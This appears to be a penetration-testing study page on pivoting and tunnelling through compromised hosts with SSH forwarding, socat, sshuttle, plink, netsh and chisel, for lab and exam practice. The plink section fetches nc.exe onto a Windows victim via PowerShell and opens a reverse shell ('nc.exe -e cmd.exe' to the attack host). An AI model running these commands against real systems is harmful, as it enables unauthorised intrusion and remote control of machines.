# Tunneling

##

## SSH Local Port Forwarding

{% code title="nc port scan" overflow="wrap" lineNumbers="true" %}
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```
{% endcode %}

The below command is run on Server A to create the SSH tunnel through Server B and reach Server C.&#x20;

{% code title="the command is run on Server A" overflow="wrap" lineNumbers="true" %}
```
ssh -N -L 0.0.0.0:4455:172.16.167.217:445 database_admin@10.4.167.215
```
{% endcode %}

kali -> (Server A) 192.168.167.63 -> (Server B) 10.4.167.215->(Server C) 172.16.167.217&#x20;

Now from Kali VM we can reach Server C and access the SMB Server.

```
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

So when you want to reach a port that is open only on the victim machine, but not from your attack host, you will use local port forwarding.

```
ssh -L 1234:localhost:5432 user@{target_IP}
```

### Socat

{% code title="on the victim -Running the Socat port forward command." overflow="wrap" lineNumbers="true" %}
```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
{% endcode %}

{% code title="On the kali box - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward." overflow="wrap" lineNumbers="true" %}
```
psql -h 192.168.50.63 -p 2345 -U postgres
```
{% endcode %}

## SSH Dynamic Port Forwarding

```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999
```

```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

## SSH Remote Port Forwarding

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.

```
sudo systemctl start ssh
```

{% code title="Checking that the SSH server on the Kali machine is listening." overflow="wrap" lineNumbers="true" %}
```
sudo ss -ntplu
```
{% endcode %}

The SSH remote port forward option is -R, and has a very similar syntax to the local port forward option. It also takes two socket pairs as the argument. The listening socket is defined first, and the forwarding socket is second.

In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).

```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

{% code title="Checking if port 2345 is bound on the Kali SSH server." overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ ss -ntplu
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      128             [::]:22           [::]:*

```
{% endcode %}

{% hint style="info" %}
In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd\_config.
{% endhint %}



## SSH Remote Dynamic Port Forwarding

{% hint style="info" %}
Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6.2 Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.
{% endhint %}

The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same -R option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply specify -R 9998 to the SSH command we run on CONFLUENCE01. We'll also pass the -N flag to prevent a shell from being opened.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'


ssh -N -R 9998 kali@192.168.118.4
```

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998

```

```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

## SSHuttle

In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. sshuttle1 is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.

```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## Reverse tunnel to attack host

UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no. The first option prevents ssh from attempting to save the host key by sending the output to /dev/null. The second option will instruct ssh to not prompt us to accept the host key. Both of these options can be set via the -o flag.

```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/nul
l" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

\+ generate and use keys (page 779 PWK)

## Reverse dynamic port forwarding

newer versions of ssh support this feature

We will only need one port forwarding option, which is -R 1080. By not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali server. We also need to change the location of the private key

```
ssh -f -N -D 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /
var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
```

### Proxychains

configure proxychains on Kali to use the SOCKS proxy. We can do this by opening etc/proxychains.conf and editing the last line, specifying port 1080.

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
```

{% hint style="info" %}
Network scanning with ProxyChains will be slow so we will start with only the top 20 ports and expand our scope if needed.

You can speed up network scanning through proxychains by modifying the timeout via the tcp\_read\_time\_out and tcp\_connect\_time\_out values in /etc/proxychains.conf. However, don’t set these too low or you will receive incorrect results.
{% endhint %}

SOCKS proxies require a TCP connection to be made and thus a half-open or SYN scan cannot be used with ProxyChains.740 Since SOCKS proxies require a TCP connection, ICMP cannot get through either and we must disable pinging with the -Pn flag.

```
kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
```

### nmap proxychains scan

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5 2>/dev/null

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 22:35 EET
Nmap scan report for static-172-16-1-10.rdsnet.ro (172.16.1.10)
Host is up (0.051s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## SSH.exe

The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update),1 and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update).2 On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-\* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>
```

Notably, the version of OpenSSH bundled with Windows is higher than 7.6, meaning we can use it for remote dynamic port forwarding.

```
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```

```
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
kali@192.168.118.4's password:

```

```
kali@kali:~$ tail /etc/proxychains4.conf             
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998

```

## PLINK.exe

```
You need to have SYSTEM rights on the windows box.
```

this looks promising [https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/](https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/)

```
kali@kali:~$ sudo systemctl start apache2
[sudo] password for kali: 

kali@kali:~$
```

```
kali@kali:~$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe

kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe

```

```
nc -nvlp 4446
```

```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

```
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe

kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
[sudo] password for kali: 

kali@kali:~$ 
```

{% code title="" overflow="wrap" lineNumbers="true" %}
```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe

c:\windows\system32\inetsrv>
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
y
```
{% endcode %}

{% hint style="info" %}
In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be: cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.
{% endhint %}

```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

## NETSH

{% hint style="info" %}
The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.
{% endhint %}

```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
```

In our RDP session, we can run cmd.exe as administrator to open a command window.

Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).

{% code overflow="wrap" %}
```
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

C:\Windows\system32>

```
{% endcode %}

```
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING

C:\Windows\system32>
```

```
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.50.64   2222        10.4.50.215     22
```

```
kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:27 EDT
Nmap scan report for 192.168.50.64
Host is up (0.00055s latency).

PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
MAC Address: 00:0C:29:A9:9F:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds

```

{% code title="" overflow="wrap" lineNumbers="true" %}
```
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.

C:\Windows\system32>
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:28 EDT
Nmap scan report for 192.168.50.64
Host is up (0.00060s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
MAC Address: 00:0C:29:A9:9F:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```
{% endcode %}

Using netsh advfirewall firewall, we can delete the rule, referencing it by its catchy name: "port\_forward\_ssh\_2222".

{% code title="" overflow="wrap" lineNumbers="true" %}
```
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
Deleted 1 rule(s). Ok.
 
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

C:\Windows\Administrator>

```
{% endcode %}

## Chisel

{% embed url="https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683" %}

{% embed url="https://github.com/jpillora/chisel" %}

###

### Chisel local port forwarding

On the attack host

```
chisel server -p 8888 -reverse
```

On the victim(windows)

```
.\chisel.exe client 10.10.14.89:8888 R:1082:localhost:4444
```

On the attack host again to connect to forwarded port

```
nc -nv 127.0.0.1 1082
```

### On attacking box/kali from previous exam

```
chisel  server -p 8000 reverse
```

### On victim from previous exam

```
chisel.exe client 192.168.49.138:8000 R:socks
```

Or as mentioned in the above document:

### On the Attack Machine <a href="#id-94ad" id="id-94ad"></a>

```
chisel server -p 3477 --socks5 --reverse
```



### On the Victim Machine <a href="#id-9a15" id="id-9a15"></a>

```
chisel client 13.37.13.37:3477 R:5000:socks
```

### Proxychains

`/etc/proxychains.conf`

![](https://miro.medium.com/max/700/1\*mhBYMO2hZA0ZM5sCgwebLQ.png)

```
socks5
```
